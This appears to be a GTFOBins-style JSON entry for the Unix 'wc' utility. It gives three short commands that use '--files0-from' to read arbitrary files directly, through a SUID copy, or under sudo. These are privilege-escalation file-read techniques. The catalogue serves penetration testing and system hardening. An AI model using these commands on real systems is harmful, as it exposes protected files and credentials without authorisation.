{
  "functions": {
    "file-read": [
      {
        "description": "",
        "code": "LFILE=file_to_read\nwc --files0-from \"$LFILE\"\n"
      }
    ],
    "suid": [
      {
        "description": "",
        "code": "LFILE=file_to_read\n./wc --files0-from \"$LFILE\"\n"
      }
    ],
    "sudo": [
      {
        "description": "",
        "code": "LFILE=file_to_read\nsudo wc --files0-from \"$LFILE\"\n"
      }
    ]
  }
}
